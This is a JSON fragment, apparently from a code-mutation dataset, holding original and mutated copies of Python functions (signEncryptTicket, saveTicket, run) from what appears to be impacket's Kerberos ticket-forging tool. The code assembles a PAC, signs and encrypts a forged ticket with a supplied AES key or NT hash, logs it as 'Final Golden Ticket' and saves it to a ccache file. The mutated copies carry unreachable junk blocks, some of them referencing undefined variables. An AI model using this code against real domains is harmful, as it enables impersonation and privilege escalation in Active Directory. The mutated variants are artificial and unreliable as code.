            "def signEncryptTicket(self, kdcRep, encASorTGSRepPart, encTicketPart, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    logging.info('Signing/Encrypting final ticket')\n    pac_count = 4\n    validationInfoBlob = pacInfos[PAC_LOGON_INFO]\n    validationInfoAlignment = b'\\x00' * self.getPadLength(len(validationInfoBlob))\n    pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]\n    pacClientInfoAlignment = b'\\x00' * self.getPadLength(len(pacClientInfoBlob))\n    pacUpnDnsInfoBlob = None\n    pacUpnDnsInfoAlignment = None\n    if PAC_UPN_DNS_INFO in pacInfos:\n        pac_count += 1\n        pacUpnDnsInfoBlob = pacInfos[PAC_UPN_DNS_INFO]\n        pacUpnDnsInfoAlignment = b'\\x00' * self.getPadLength(len(pacUpnDnsInfoBlob))\n    pacAttributesInfoBlob = None\n    pacAttributesInfoAlignment = None\n    if PAC_ATTRIBUTES_INFO in pacInfos:\n        pac_count += 1\n        pacAttributesInfoBlob = pacInfos[PAC_ATTRIBUTES_INFO]\n        pacAttributesInfoAlignment = b'\\x00' * self.getPadLength(len(pacAttributesInfoBlob))\n    pacRequestorInfoBlob = None\n    pacRequestorInfoAlignment = None\n    if PAC_REQUESTOR_INFO in pacInfos:\n        pac_count += 1\n        pacRequestorInfoBlob = pacInfos[PAC_REQUESTOR_INFO]\n        pacRequestorInfoAlignment = b'\\x00' * self.getPadLength(len(pacRequestorInfoBlob))\n    serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])\n    serverChecksumBlob = pacInfos[PAC_SERVER_CHECKSUM]\n    serverChecksumAlignment = b'\\x00' * self.getPadLength(len(serverChecksumBlob))\n    privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])\n    privSvrChecksumBlob = pacInfos[PAC_PRIVSVR_CHECKSUM]\n    privSvrChecksumAlignment = b'\\x00' * self.getPadLength(len(privSvrChecksumBlob))\n    offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * pac_count\n    validationInfoIB = PAC_INFO_BUFFER()\n    validationInfoIB['ulType'] = PAC_LOGON_INFO\n    validationInfoIB['cbBufferSize'] = len(validationInfoBlob)\n    validationInfoIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + validationInfoIB['cbBufferSize'])\n    pacClientInfoIB = PAC_INFO_BUFFER()\n    pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE\n    pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)\n    pacClientInfoIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + pacClientInfoIB['cbBufferSize'])\n    pacUpnDnsInfoIB = None\n    if pacUpnDnsInfoBlob is not None:\n        pacUpnDnsInfoIB = PAC_INFO_BUFFER()\n        pacUpnDnsInfoIB['ulType'] = PAC_UPN_DNS_INFO\n        pacUpnDnsInfoIB['cbBufferSize'] = len(pacUpnDnsInfoBlob)\n        pacUpnDnsInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacUpnDnsInfoIB['cbBufferSize'])\n    pacAttributesInfoIB = None\n    if pacAttributesInfoBlob is not None:\n        pacAttributesInfoIB = PAC_INFO_BUFFER()\n        pacAttributesInfoIB['ulType'] = PAC_ATTRIBUTES_INFO\n        pacAttributesInfoIB['cbBufferSize'] = len(pacAttributesInfoBlob)\n        pacAttributesInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacAttributesInfoIB['cbBufferSize'])\n    pacRequestorInfoIB = None\n    if pacRequestorInfoBlob is not None:\n        pacRequestorInfoIB = PAC_INFO_BUFFER()\n        pacRequestorInfoIB['ulType'] = PAC_REQUESTOR_INFO\n        pacRequestorInfoIB['cbBufferSize'] = len(pacRequestorInfoBlob)\n        pacRequestorInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacRequestorInfoIB['cbBufferSize'])\n    serverChecksumIB = PAC_INFO_BUFFER()\n    serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM\n    serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)\n    serverChecksumIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + serverChecksumIB['cbBufferSize'])\n    privSvrChecksumIB = PAC_INFO_BUFFER()\n    privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM\n    privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)\n    privSvrChecksumIB['Offset'] = offsetData\n    buffers = validationInfoIB.getData() + pacClientInfoIB.getData()\n    if pacUpnDnsInfoIB is not None:\n        buffers += pacUpnDnsInfoIB.getData()\n    if pacAttributesInfoIB is not None:\n        buffers += pacAttributesInfoIB.getData()\n    if pacRequestorInfoIB is not None:\n        buffers += pacRequestorInfoIB.getData()\n    buffers += serverChecksumIB.getData() + privSvrChecksumIB.getData() + validationInfoBlob + validationInfoAlignment + pacInfos[PAC_CLIENT_INFO_TYPE] + pacClientInfoAlignment\n    if pacUpnDnsInfoIB is not None:\n        buffers += pacUpnDnsInfoBlob + pacUpnDnsInfoAlignment\n    if pacAttributesInfoIB is not None:\n        buffers += pacAttributesInfoBlob + pacAttributesInfoAlignment\n    if pacRequestorInfoIB is not None:\n        buffers += pacRequestorInfoBlob + pacRequestorInfoAlignment\n    buffersTail = serverChecksumBlob + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment\n    pacType = PACTYPE()\n    pacType['cBuffers'] = pac_count\n    pacType['Version'] = 0\n    pacType['Buffers'] = buffers + buffersTail\n    blobToChecksum = pacType.getData()\n    checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]\n    if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n        keyServer = Key(Enctype.AES256, unhexlify(self.__options.aesKey))\n    elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n        keyServer = Key(Enctype.AES128, unhexlify(self.__options.aesKey))\n    elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:\n        keyServer = Key(Enctype.RC4, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'])\n    checkSumFunctionPriv = _checksum_table[privSvrChecksum['SignatureType']]\n    if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n        keyPriv = Key(Enctype.AES256, unhexlify(self.__options.aesKey))\n    elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n        keyPriv = Key(Enctype.AES128, unhexlify(self.__options.aesKey))\n    elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:\n        keyPriv = Key(Enctype.RC4, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Invalid Priv checksum type 0x%x' % serverChecksum['SignatureType'])\n    serverChecksum['Signature'] = checkSumFunctionServer.checksum(keyServer, KERB_NON_KERB_CKSUM_SALT, blobToChecksum)\n    logging.info('\\tPAC_SERVER_CHECKSUM')\n    privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, KERB_NON_KERB_CKSUM_SALT, serverChecksum['Signature'])\n    logging.info('\\tPAC_PRIVSVR_CHECKSUM')\n    buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment\n    pacType['Buffers'] = buffers + buffersTail\n    authorizationData = AuthorizationData()\n    authorizationData[0] = noValue\n    authorizationData[0]['ad-type'] = AuthorizationDataType.AD_WIN2K_PAC.value\n    authorizationData[0]['ad-data'] = pacType.getData()\n    authorizationData = encoder.encode(authorizationData)\n    encTicketPart['authorization-data'][0]['ad-data'] = authorizationData\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Customized EncTicketPart')\n        print(encTicketPart.prettyPrint())\n        print('\\n')\n    encodedEncTicketPart = encoder.encode(encTicketPart)\n    cipher = _enctype_table[kdcRep['ticket']['enc-part']['etype']]\n    if cipher.enctype == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.aesKey))\n    elif cipher.enctype == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.aesKey))\n    elif cipher.enctype == EncryptionTypes.rc4_hmac.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Unsupported enctype 0x%x' % cipher.enctype)\n    logging.info('\\tEncTicketPart')\n    cipherText = cipher.encrypt(key, 2, encodedEncTicketPart, None)\n    kdcRep['ticket']['enc-part']['cipher'] = cipherText\n    kdcRep['ticket']['enc-part']['kvno'] = 2\n    encodedEncASRepPart = encoder.encode(encASorTGSRepPart)\n    if self.__domain == self.__server:\n        sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())\n        logging.info('\\tEncASRepPart')\n        cipherText = cipher.encrypt(sessionKey, 3, encodedEncASRepPart, None)\n    else:\n        sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())\n        logging.info('\\tEncTGSRepPart')\n        cipherText = cipher.encrypt(sessionKey, 8, encodedEncASRepPart, None)\n    kdcRep['enc-part']['cipher'] = cipherText\n    kdcRep['enc-part']['etype'] = cipher.enctype\n    kdcRep['enc-part']['kvno'] = 1\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final Golden Ticket')\n        print(kdcRep.prettyPrint())\n        print('\\n')\n    return (encoder.encode(kdcRep), cipher, sessionKey)",
            "def signEncryptTicket(self, kdcRep, encASorTGSRepPart, encTicketPart, pacInfos):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    logging.info('Signing/Encrypting final ticket')\n    pac_count = 4\n    validationInfoBlob = pacInfos[PAC_LOGON_INFO]\n    validationInfoAlignment = b'\\x00' * self.getPadLength(len(validationInfoBlob))\n    pacClientInfoBlob = pacInfos[PAC_CLIENT_INFO_TYPE]\n    pacClientInfoAlignment = b'\\x00' * self.getPadLength(len(pacClientInfoBlob))\n    pacUpnDnsInfoBlob = None\n    pacUpnDnsInfoAlignment = None\n    if PAC_UPN_DNS_INFO in pacInfos:\n        pac_count += 1\n        pacUpnDnsInfoBlob = pacInfos[PAC_UPN_DNS_INFO]\n        pacUpnDnsInfoAlignment = b'\\x00' * self.getPadLength(len(pacUpnDnsInfoBlob))\n    pacAttributesInfoBlob = None\n    pacAttributesInfoAlignment = None\n    if PAC_ATTRIBUTES_INFO in pacInfos:\n        pac_count += 1\n        pacAttributesInfoBlob = pacInfos[PAC_ATTRIBUTES_INFO]\n        pacAttributesInfoAlignment = b'\\x00' * self.getPadLength(len(pacAttributesInfoBlob))\n    pacRequestorInfoBlob = None\n    pacRequestorInfoAlignment = None\n    if PAC_REQUESTOR_INFO in pacInfos:\n        pac_count += 1\n        pacRequestorInfoBlob = pacInfos[PAC_REQUESTOR_INFO]\n        pacRequestorInfoAlignment = b'\\x00' * self.getPadLength(len(pacRequestorInfoBlob))\n    serverChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_SERVER_CHECKSUM])\n    serverChecksumBlob = pacInfos[PAC_SERVER_CHECKSUM]\n    serverChecksumAlignment = b'\\x00' * self.getPadLength(len(serverChecksumBlob))\n    privSvrChecksum = PAC_SIGNATURE_DATA(pacInfos[PAC_PRIVSVR_CHECKSUM])\n    privSvrChecksumBlob = pacInfos[PAC_PRIVSVR_CHECKSUM]\n    privSvrChecksumAlignment = b'\\x00' * self.getPadLength(len(privSvrChecksumBlob))\n    offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * pac_count\n    validationInfoIB = PAC_INFO_BUFFER()\n    validationInfoIB['ulType'] = PAC_LOGON_INFO\n    validationInfoIB['cbBufferSize'] = len(validationInfoBlob)\n    validationInfoIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + validationInfoIB['cbBufferSize'])\n    pacClientInfoIB = PAC_INFO_BUFFER()\n    pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE\n    pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)\n    pacClientInfoIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + pacClientInfoIB['cbBufferSize'])\n    pacUpnDnsInfoIB = None\n    if pacUpnDnsInfoBlob is not None:\n        pacUpnDnsInfoIB = PAC_INFO_BUFFER()\n        pacUpnDnsInfoIB['ulType'] = PAC_UPN_DNS_INFO\n        pacUpnDnsInfoIB['cbBufferSize'] = len(pacUpnDnsInfoBlob)\n        pacUpnDnsInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacUpnDnsInfoIB['cbBufferSize'])\n    pacAttributesInfoIB = None\n    if pacAttributesInfoBlob is not None:\n        pacAttributesInfoIB = PAC_INFO_BUFFER()\n        pacAttributesInfoIB['ulType'] = PAC_ATTRIBUTES_INFO\n        pacAttributesInfoIB['cbBufferSize'] = len(pacAttributesInfoBlob)\n        pacAttributesInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacAttributesInfoIB['cbBufferSize'])\n    pacRequestorInfoIB = None\n    if pacRequestorInfoBlob is not None:\n        pacRequestorInfoIB = PAC_INFO_BUFFER()\n        pacRequestorInfoIB['ulType'] = PAC_REQUESTOR_INFO\n        pacRequestorInfoIB['cbBufferSize'] = len(pacRequestorInfoBlob)\n        pacRequestorInfoIB['Offset'] = offsetData\n        offsetData = self.getBlockLength(offsetData + pacRequestorInfoIB['cbBufferSize'])\n    serverChecksumIB = PAC_INFO_BUFFER()\n    serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM\n    serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)\n    serverChecksumIB['Offset'] = offsetData\n    offsetData = self.getBlockLength(offsetData + serverChecksumIB['cbBufferSize'])\n    privSvrChecksumIB = PAC_INFO_BUFFER()\n    privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM\n    privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)\n    privSvrChecksumIB['Offset'] = offsetData\n    buffers = validationInfoIB.getData() + pacClientInfoIB.getData()\n    if pacUpnDnsInfoIB is not None:\n        buffers += pacUpnDnsInfoIB.getData()\n    if pacAttributesInfoIB is not None:\n        buffers += pacAttributesInfoIB.getData()\n    if pacRequestorInfoIB is not None:\n        buffers += pacRequestorInfoIB.getData()\n    buffers += serverChecksumIB.getData() + privSvrChecksumIB.getData() + validationInfoBlob + validationInfoAlignment + pacInfos[PAC_CLIENT_INFO_TYPE] + pacClientInfoAlignment\n    if pacUpnDnsInfoIB is not None:\n        buffers += pacUpnDnsInfoBlob + pacUpnDnsInfoAlignment\n    if pacAttributesInfoIB is not None:\n        buffers += pacAttributesInfoBlob + pacAttributesInfoAlignment\n    if pacRequestorInfoIB is not None:\n        buffers += pacRequestorInfoBlob + pacRequestorInfoAlignment\n    buffersTail = serverChecksumBlob + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment\n    pacType = PACTYPE()\n    pacType['cBuffers'] = pac_count\n    pacType['Version'] = 0\n    pacType['Buffers'] = buffers + buffersTail\n    blobToChecksum = pacType.getData()\n    checkSumFunctionServer = _checksum_table[serverChecksum['SignatureType']]\n    if serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n        keyServer = Key(Enctype.AES256, unhexlify(self.__options.aesKey))\n    elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n        keyServer = Key(Enctype.AES128, unhexlify(self.__options.aesKey))\n    elif serverChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:\n        keyServer = Key(Enctype.RC4, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Invalid Server checksum type 0x%x' % serverChecksum['SignatureType'])\n    checkSumFunctionPriv = _checksum_table[privSvrChecksum['SignatureType']]\n    if privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:\n        keyPriv = Key(Enctype.AES256, unhexlify(self.__options.aesKey))\n    elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:\n        keyPriv = Key(Enctype.AES128, unhexlify(self.__options.aesKey))\n    elif privSvrChecksum['SignatureType'] == ChecksumTypes.hmac_md5.value:\n        keyPriv = Key(Enctype.RC4, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Invalid Priv checksum type 0x%x' % serverChecksum['SignatureType'])\n    serverChecksum['Signature'] = checkSumFunctionServer.checksum(keyServer, KERB_NON_KERB_CKSUM_SALT, blobToChecksum)\n    logging.info('\\tPAC_SERVER_CHECKSUM')\n    privSvrChecksum['Signature'] = checkSumFunctionPriv.checksum(keyPriv, KERB_NON_KERB_CKSUM_SALT, serverChecksum['Signature'])\n    logging.info('\\tPAC_PRIVSVR_CHECKSUM')\n    buffersTail = serverChecksum.getData() + serverChecksumAlignment + privSvrChecksum.getData() + privSvrChecksumAlignment\n    pacType['Buffers'] = buffers + buffersTail\n    authorizationData = AuthorizationData()\n    authorizationData[0] = noValue\n    authorizationData[0]['ad-type'] = AuthorizationDataType.AD_WIN2K_PAC.value\n    authorizationData[0]['ad-data'] = pacType.getData()\n    authorizationData = encoder.encode(authorizationData)\n    encTicketPart['authorization-data'][0]['ad-data'] = authorizationData\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Customized EncTicketPart')\n        print(encTicketPart.prettyPrint())\n        print('\\n')\n    encodedEncTicketPart = encoder.encode(encTicketPart)\n    cipher = _enctype_table[kdcRep['ticket']['enc-part']['etype']]\n    if cipher.enctype == EncryptionTypes.aes256_cts_hmac_sha1_96.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.aesKey))\n    elif cipher.enctype == EncryptionTypes.aes128_cts_hmac_sha1_96.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.aesKey))\n    elif cipher.enctype == EncryptionTypes.rc4_hmac.value:\n        key = Key(cipher.enctype, unhexlify(self.__options.nthash))\n    else:\n        raise Exception('Unsupported enctype 0x%x' % cipher.enctype)\n    logging.info('\\tEncTicketPart')\n    cipherText = cipher.encrypt(key, 2, encodedEncTicketPart, None)\n    kdcRep['ticket']['enc-part']['cipher'] = cipherText\n    kdcRep['ticket']['enc-part']['kvno'] = 2\n    encodedEncASRepPart = encoder.encode(encASorTGSRepPart)\n    if self.__domain == self.__server:\n        sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())\n        logging.info('\\tEncASRepPart')\n        cipherText = cipher.encrypt(sessionKey, 3, encodedEncASRepPart, None)\n    else:\n        sessionKey = Key(cipher.enctype, encASorTGSRepPart['key']['keyvalue'].asOctets())\n        logging.info('\\tEncTGSRepPart')\n        cipherText = cipher.encrypt(sessionKey, 8, encodedEncASRepPart, None)\n    kdcRep['enc-part']['cipher'] = cipherText\n    kdcRep['enc-part']['etype'] = cipher.enctype\n    kdcRep['enc-part']['kvno'] = 1\n    if logging.getLogger().level == logging.DEBUG:\n        logging.debug('Final Golden Ticket')\n        print(kdcRep.prettyPrint())\n        print('\\n')\n    return (encoder.encode(kdcRep), cipher, sessionKey)"
        ]
    },
    {
        "func_name": "saveTicket",
        "original": "def saveTicket(self, ticket, sessionKey):\n    logging.info('Saving ticket in %s' % (self.__target.replace('/', '.') + '.ccache'))\n    from impacket.krb5.ccache import CCache\n    ccache = CCache()\n    if self.__server == self.__domain:\n        ccache.fromTGT(ticket, sessionKey, sessionKey)\n    else:\n        ccache.fromTGS(ticket, sessionKey, sessionKey)\n    ccache.saveFile(self.__target.replace('/', '.') + '.ccache')",
        "mutated": [
            "def saveTicket(self, ticket, sessionKey):\n    if False:\n        i = 10\n    logging.info('Saving ticket in %s' % (self.__target.replace('/', '.') + '.ccache'))\n    from impacket.krb5.ccache import CCache\n    ccache = CCache()\n    if self.__server == self.__domain:\n        ccache.fromTGT(ticket, sessionKey, sessionKey)\n    else:\n        ccache.fromTGS(ticket, sessionKey, sessionKey)\n    ccache.saveFile(self.__target.replace('/', '.') + '.ccache')",
            "def saveTicket(self, ticket, sessionKey):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    logging.info('Saving ticket in %s' % (self.__target.replace('/', '.') + '.ccache'))\n    from impacket.krb5.ccache import CCache\n    ccache = CCache()\n    if self.__server == self.__domain:\n        ccache.fromTGT(ticket, sessionKey, sessionKey)\n    else:\n        ccache.fromTGS(ticket, sessionKey, sessionKey)\n    ccache.saveFile(self.__target.replace('/', '.') + '.ccache')",
            "def saveTicket(self, ticket, sessionKey):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    logging.info('Saving ticket in %s' % (self.__target.replace('/', '.') + '.ccache'))\n    from impacket.krb5.ccache import CCache\n    ccache = CCache()\n    if self.__server == self.__domain:\n        ccache.fromTGT(ticket, sessionKey, sessionKey)\n    else:\n        ccache.fromTGS(ticket, sessionKey, sessionKey)\n    ccache.saveFile(self.__target.replace('/', '.') + '.ccache')",
            "def saveTicket(self, ticket, sessionKey):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    logging.info('Saving ticket in %s' % (self.__target.replace('/', '.') + '.ccache'))\n    from impacket.krb5.ccache import CCache\n    ccache = CCache()\n    if self.__server == self.__domain:\n        ccache.fromTGT(ticket, sessionKey, sessionKey)\n    else:\n        ccache.fromTGS(ticket, sessionKey, sessionKey)\n    ccache.saveFile(self.__target.replace('/', '.') + '.ccache')",
            "def saveTicket(self, ticket, sessionKey):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    logging.info('Saving ticket in %s' % (self.__target.replace('/', '.') + '.ccache'))\n    from impacket.krb5.ccache import CCache\n    ccache = CCache()\n    if self.__server == self.__domain:\n        ccache.fromTGT(ticket, sessionKey, sessionKey)\n    else:\n        ccache.fromTGS(ticket, sessionKey, sessionKey)\n    ccache.saveFile(self.__target.replace('/', '.') + '.ccache')"
        ]
    },
    {
        "func_name": "run",
        "original": "def run(self):\n    (ticket, adIfRelevant) = self.createBasicTicket()\n    if ticket is not None:\n        (encASorTGSRepPart, encTicketPart, pacInfos) = self.customizeTicket(ticket, adIfRelevant)\n        (ticket, cipher, sessionKey) = self.signEncryptTicket(ticket, encASorTGSRepPart, encTicketPart, pacInfos)\n        self.saveTicket(ticket, sessionKey)",
        "mutated": [
            "def run(self):\n    if False:\n        i = 10\n    (ticket, adIfRelevant) = self.createBasicTicket()\n    if ticket is not None:\n        (encASorTGSRepPart, encTicketPart, pacInfos) = self.customizeTicket(ticket, adIfRelevant)\n        (ticket, cipher, sessionKey) = self.signEncryptTicket(ticket, encASorTGSRepPart, encTicketPart, pacInfos)\n        self.saveTicket(ticket, sessionKey)",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    (ticket, adIfRelevant) = self.createBasicTicket()\n    if ticket is not None:\n        (encASorTGSRepPart, encTicketPart, pacInfos) = self.customizeTicket(ticket, adIfRelevant)\n        (ticket, cipher, sessionKey) = self.signEncryptTicket(ticket, encASorTGSRepPart, encTicketPart, pacInfos)\n        self.saveTicket(ticket, sessionKey)",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n    (ticket, adIfRelevant) = self.createBasicTicket()\n    if ticket is not None:\n        (encASorTGSRepPart, encTicketPart, pacInfos) = self.customizeTicket(ticket, adIfRelevant)\n        (ticket, cipher, sessionKey) = self.signEncryptTicket(ticket, encASorTGSRepPart, encTicketPart, pacInfos)\n        self.saveTicket(ticket, sessionKey)",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    (ticket, adIfRelevant) = self.createBasicTicket()\n    if ticket is not None:\n        (encASorTGSRepPart, encTicketPart, pacInfos) = self.customizeTicket(ticket, adIfRelevant)\n        (ticket, cipher, sessionKey) = self.signEncryptTicket(ticket, encASorTGSRepPart, encTicketPart, pacInfos)\n        self.saveTicket(ticket, sessionKey)",
            "def run(self):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    (ticket, adIfRelevant) = self.createBasicTicket()\n    if ticket is not None:\n        (encASorTGSRepPart, encTicketPart, pacInfos) = self.customizeTicket(ticket, adIfRelevant)\n        (ticket, cipher, sessionKey) = self.signEncryptTicket(ticket, encASorTGSRepPart, encTicketPart, pacInfos)\n        self.saveTicket(ticket, sessionKey)"
        ]
    }
]